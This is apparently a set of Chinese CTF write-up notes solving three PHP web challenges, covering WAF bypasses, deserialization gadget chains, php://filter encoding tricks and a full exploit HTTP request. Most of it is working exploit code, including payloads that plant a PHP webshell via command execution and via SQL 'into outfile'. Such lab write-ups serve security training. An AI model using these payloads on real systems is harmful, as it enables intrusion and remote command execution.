- > 复现
- # easy_include
	- 思路：绕过waf实现本地include+session构造恶意文件
	- 绕过waf
		- php支持`file://localhost/etc/passwd`这样的文件include
		- ((65b3d87d-c0d2-45b0-8736-6cdec74a9406))
- # easy_web
	- 思路：
		- 绕WAF实现反序列化
		- 利用伪协议与编码格式构造字符串
		- 绕WAF实现命令执行
	- 绕WAF实现反序列化
		- 链：`ctf::__destruct --> show::__call --> Chu0_write::__toString`
			- ```php
			  $chu = new Chu0_write();
			  $chu->chu0 = "";
			  $chu->chu1 = "";
			  $show = new show();
			  $ctf = new ctf();
			  $ctf->h1 = $show;
			  $ctf->h2 = [
			      [
			          0,
			          1,
			          $chu
			      ]
			  ];
			  $a = new ArrayObject([114 => 514]);
			  $a -> o = $ctf; // 把它塞进ArrayObject里
			  
			  echo "sta"."rt" .  base64_encode(serialize($a)) . "stop";
			  ```
		- `show_show.show`
			- 使用`show[show.show`代替
		- `waf1($_REQUEST);`
			- 使用POST参数覆盖GET参数
		- `waf2($_SERVER['QUERY_STRING']);`
			- 使用urlencode编码`show`
		- `preg_match('/^[Oa]:[\d]/i',$_GET['show_show.show'])`
			- 使用 ((6569d71e-f0f4-4d99-961c-e306b814b20e))
	- 利用伪协议与编码格式构造字符串
		- 题目允许我们将恶意内容写入`ctfw.txt`文件，然后用伪协议读取`ctfw.txt`，最后将读取结果作为函数执行
			- 但是恶意内容前面有一串无用字符串，需要考虑过滤
		- 可以使用utf16转utf8将后面的内容转成乱码，并使用base64_decode去除
		- ```php
		  $payload = "php://filter/write=convert.iconv.UTF-8.UTF-16/resource=ctfw";
		  var_dump(waf_in_waf_php($payload));
		  file_put_contents($payload . ".txt", base64_encode("passthru"));
		  
		  $content = file_get_contents("ctfw.txt");
		  # 这是写入ctfw.txt的内容
		  var_dump(urlencode($content));
		  # 这个是提交的伪协议
		  $payload = "php://filter/write=convert.iconv.UTF-16.UTF-8|convert.base64-decode/resource=ctfw";
		  
		  file_put_contents($payload . ".txt", "ctfshowshowshowwww" . $content);
		  ```
	- 绕waf实现命令执行
		- 题目禁了很多符号，不能使用glob或其他技巧绕过waf
		- 这里可以使用python构造任意字符串并执行
		- 这里可以写一小段python实现payload生成
			- ```python
			  revshell = "+".join(f"chr({ord(c)})" for c in "echo '<?=`$_GET[1]`?>' > s.php")
			  payload = "python -c \"print(__import__(chr(111)+chr(115)).popen(revshell))\""
			  payload = payload.replace("revshell", revshell)
			  payload = encoder.urlencode(payload.replace(" ", "\t"))
			  print(payload)
			  print(len(payload))
			  ```
	- 最终的http请求如下
		- ```http
		  POST /?name=php://filter/write=convert.iconv.UTF-16.UTF-8|convert.base64-decode/resource=ctfw&chu0=%FF%FEc%00G%00F%00z%00c%003%00R%00o%00c%00n%00U%00%3D%00&cmd=python%09-c%09%22print%28__import__%28chr%28111%29%2Bchr%28115%29%29.popen%28chr%28101%29%2Bchr%2899%29%2Bchr%28104%29%2Bchr%28111%29%2Bchr%2832%29%2Bchr%2839%29%2Bchr%2860%29%2Bchr%2863%29%2Bchr%2861%29%2Bchr%2896%29%2Bchr%2836%29%2Bchr%2895%29%2Bchr%2871%29%2Bchr%2869%29%2Bchr%2884%29%2Bchr%2891%29%2Bchr%2849%29%2Bchr%2893%29%2Bchr%2896%29%2Bchr%2863%29%2Bchr%2862%29%2Bchr%2839%29%2Bchr%2832%29%2Bchr%2862%29%2Bchr%2832%29%2Bchr%28115%29%2Bchr%2846%29%2Bchr%28112%29%2Bchr%28104%29%2Bchr%28112%29%29%29%22&%73how%5B%73how.%73how=%43%3a%31%31%3a%22%41%72%72%61%79%4f%62%6a%65%63%74%22%3a%31%39%34%3a%7b%78%3a%69%3a%30%3b%61%3a%31%3a%7b%69%3a%31%31%34%3b%69%3a%35%31%34%3b%7d%3b%6d%3a%61%3a%31%3a%7b%73%3a%31%3a%22%6f%22%3b%4f%3a%33%3a%22%63%74%66%22%3a%32%3a%7b%73%3a%32%3a%22%68%31%22%3b%4f%3a%34%3a%22%73%68%6f%77%22%3a%30%3a%7b%7d%73%3a%32%3a%22%68%32%22%3b%61%3a%31%3a%7b%69%3a%30%3b%61%3a%33%3a%7b%69%3a%30%3b%69%3a%30%3b%69%3a%31%3b%69%3a%31%3b%69%3a%32%3b%4f%3a%31%30%3a%22%43%68%75%30%5f%77%72%69%74%65%22%3a%33%3a%7b%73%3a%34%3a%22%63%68%75%30%22%3b%73%3a%30%3a%22%22%3b%73%3a%34%3a%22%63%68%75%31%22%3b%73%3a%30%3a%22%22%3b%73%3a%33%3a%22%63%6d%64%22%3b%4e%3b%7d%7d%7d%7d%7d%7d HTTP/1.1
		  Host: 0d944c2d-9559-43bf-b125-00bea94cd9dc.challenge.ctf.show
		  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
		  Connection: close
		  Content-Type: application/x-www-form-urlencoded
		  Content-Length: 36
		  
		  show[show.show=1&name=1&chu0=1&cmd=1
		  
		  ```
- # easy_login
	- 实现反序列化
		- 注意到代码使用了`session_decode`函数，这个函数会反序列化传入的数据，所以可以使用这个函数进行反序列化
	- 非预期
		- 反序列之后直接在PDO初始化时传入让数据库执行的SQL写webshell即可
		- ```php
		  
		  $mysql = new mysql_helper();
		  $app = new application();
		  $app -> debug = true;
		  $mysql -> app = $app;
		  $app -> mysql = $mysql;
		  $mysql -> option = array(
		      1002 => "select '<?=`\$_GET[1]`?>'  into outfile '/var/www/html/shell.php';"
		  );
		  $sess = 'user|' . serialize($mysql);
		  session_decode($sess);
		  echo "start" . base64_encode($sess) . "stop";
		  ```
	- ~~控制类的嵌套结构实现控制`__wakeup`的先后，绕过`mysql_helper::__wakeup`带来的限制~~
	  collapsed:: true
		- 这里`mysql_helper::__wakeup`会重置数据库的配置数据，可以通过`__wakeup`绕过解除限制
		- 但是`__wakeup`绕过会导致外层的app对象无法正常反序列化
		- 这里可以让mysql_helper持有对app的引用，然后反序列化mysql_helper，这样就可以让app的wakeup先于mysql_helper
		- ```php
		  $mysql = new mysql_helper();
		  $app = new application();
		  $app -> debug = true;
		  $mysql -> app = $app;
		  $app -> mysql = $mysql; // 这里
		  $sess = 'user|' . serialize($mysql);
		  session_decode($sess);
		  echo "start" . base64_encode($sess) . "stop";
		  
		  ```
	-